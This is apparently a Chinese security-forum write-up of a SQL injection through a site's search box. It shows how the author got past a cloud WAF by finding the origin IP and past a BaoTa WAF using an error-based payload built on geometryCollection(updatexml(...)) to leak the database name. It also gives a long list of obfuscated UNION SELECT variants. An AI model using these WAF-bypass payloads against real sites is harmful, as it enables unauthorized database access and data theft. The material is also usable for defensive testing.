

# 奇安信攻防社区-记一次SQL注入绕过宝塔+云waf

### 记一次SQL注入绕过宝塔+云waf

话不多说，上干货

## **0x01 多重waf绕过**

注入点搜索框

![](assets/1703831645-579f3bacb474299c3fd227ea82560684.png)

单双引号进行测试  
看看是字符型的还是数字型的，发现是字符型![](assets/1703831645-2dd7db655cad939059bb2e52cb096d09.png)

![](assets/1703831645-5313b6f191fecd8d6a4da71e3a359d89.png)

准备上语句发现有宝塔waf+云waf

![](assets/1703831645-336f881f44961bcbdd277cdb4f7e49a0.png)

![](assets/1703831645-980ece5b1fb23e438794d8b771cf43b2.png)

**0x02 过云waf**

首先看看有无cdn节点

![](assets/1703831645-e75296f1408db8c82b5ae1703801ea15.png)

全球ping

![](assets/1703831645-082267e2763ebaa4dd220ad861babe98.png)

发现这两个没有回应真实ip，就去看看用fofa或者hunter来在真实ip，hunter上面显示183是云厂商肯定是云waf，不能用这个ip

![](assets/1703831645-a35249814d4e26e5116db1248753588d.png)

之后在看fofa上面能不能找到真实ip

![](assets/1703831645-ed9ec442847e9ed707aad672074dbb57.png)发现这个ip跟历史解析记录是同一个c段的

![](assets/1703831645-b713d21bab5be9da8f51200c70709676.png)

然后用拦截云waf的语句来试试，发现无云waf显示

![](assets/1703831645-0cb98f7a8ba263f2042b0a3c25985398.png)

![](assets/1703831645-c40f05f34e3875d96aaa8f88a4d817ec.png)

**找云waf的几种方式**

`1. 通过全球ping``2. 找历史解析记录``3. 通过fofa或者hunter空间引擎来搜索``4.  通过历史解析记录扫c段`

## **0x03 过宝塔waf**

## **1.报错注入**

首先判断出字符型的话，就得去测试’||||’ ‘or+or’的语句，但是我发现他这里只要是在两个or之间出现东西，就一定会触发宝塔waf

![](assets/1703831645-58fcc768787280c5d8b6416cb762750a.png)

当时试了很多思路，发现可以’;%00方法，还有可以加--+注释符的，但是尝试之后只有--+可以正常回显

![](assets/1703831645-30a13d4751ff38ee23a8fe3a619ecfb2.png)

![](assets/1703831645-2c35d4e71403ee90999b4dd40c93fae8.png)

其实这里最初的思路根本不是什么’||||’，这里是按照1’||1=1来测试

![](assets/1703831645-641d2f4952bf9531c4e8de315efc473f.png)

然后尝试想把1=1，后面这个1能不能换成报错函数之类的，发现直接被拦

![](assets/1703831645-35210cfdfc5b4307582c7c187cdfd687.png)

所以我猜测这个是不是有可能把mysql所有的报错函数都给拦了一下，尝试其他的报错函数看看

exp

![](assets/1703831645-3c2b87f4849adbf6329bdced376485c1.png)

floor

![](assets/1703831645-48a110c250fff1436df44529d27d101b.png)

`例如：``Polygon，GeometryCollection，MultiPoint，MultiLineString``我发现这几个都没有过滤，可能就过滤了平常可见的报错函数`

![](assets/1703831645-88cbd89729bfcfa789f501cc12a43aa3.png)

既然这函数可以用，那我们就开始构造语句试试，正常的语句用不了，那我们就玩点不正常的

![](assets/1703831645-10d8612088d341a2e87620ed832736bf.png)

看看这函数怎么搞的，把里面的语句替换成1，看看哪里出了问题，发包，发现他这个1直接爆出来了

![](assets/1703831645-b9b0fb18c6993c380fce42d4f35806a0.png)

尝试能不能select database()这样，把库名搞出来

![](assets/1703831645-d3f1e162b170f3ee1707b5611adfdc3f.png)

发现还是不行  
可能是因为database()后面跟着--没有闭合的原因，加个||’来试试能不能闭合

![](assets/1703831645-468bec648902583bcb9856275bbf2bcb.png)

emmm，还是不行  
既然select database()不行，那就试试再套一层报错函数，看看能不能行

`Pyload：1'||1=geometryCollection(updatexml(1,concat(0x7e,database(),0x7e),1))--+`

发包

![](assets/1703831645-5e9a77b58aaaba0164f9a126d1aa0738.png)

哟西，果然能行，出库名了，成功绕过waf

## **2.联合注入**

直接'ordre by xx --+

正常判断出库名，17正常 18报错

![](assets/1703831645-63e7268d2f97a3b67ce2a57968b0158f.png)

![](assets/1703831645-636624de54cbebd98c3c66ad7949a74b.png)

然后fuzz union select 函数，尝试太多截图就不放了，直接快进到最后一步

```php
/*!%55NiOn*/ /*!%53eLEct*/ %55nion(%53elect 1,2,3)-- - +union+distinct+select+ +union+distinctROW+select+ /**//*!12345UNION SELECT*//**/ /**//*!50000UNION SELECT*//**/ /**/UNION/**//*!50000SELECT*//**/ /*!50000UniON SeLeCt*/ union /*!50000%53elect*/ +#uNiOn+#sEleCt +#1q%0AuNiOn all#qa%0A#%0AsEleCt /*!%55NiOn*/ /*!%53eLEct*/ /*!u%6eion*/ /*!se%6cect*/ +un/**/ion+se/**/lect uni%0bon+se%0blect %2f**%2funion%2f**%2fselect union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A REVERSE(noinu)+REVERSE(tceles) /*--*/union/*--*/select/*--*/ union (/*!/**/ SeleCT */ 1,2,3) /*!union*/+/*!select*/ union+/*!select*/ /**/union/**/select/**/ /**/uNIon/**/sEleCt/**/ /**//*!union*//**//*!select*//**/ /*!uNIOn*/ /*!SelECt*/ +union+distinct+select+ +union+distinctROW+select+ +UnIOn%0d%0aSeleCt%0d%0a UNION/*&test=1*/SELECT/*&pwn=2*/ un?+un/**/ion+se/**/lect+ +UNunionION+SEselectLECT+ +uni%0bon+se%0blect+ %252f%252a*/union%252f%252a /select%252f%252a*/ /%2A%2A/union/%2A%2A/select/%2A%2A/ %2f**%2funion%2f**%2fselect%2f**%2f union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A /*!UnIoN*/SeLecT+  %55nion(%53elect)   union%20distinct%20select   union%20%64istinctRO%57%20select   union%2053elect   %23?%0auion%20?%23?%0aselect   %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect   %55nion %53eLEct   u%6eion se%6cect   unio%6e %73elect   unio%6e%20%64istinc%74%20%73elect   uni%6fn distinct%52OW s%65lect
```

Pyload：

`union+distinctROW+select`

![](assets/1703831645-f6437c66a6b437551ca2d7a135929477.png)

开始构造，pyload如图，发包

![](assets/1703831645-6ee1ffe8381a11c56fb1525b31c2fcd1.png)

成功绕过
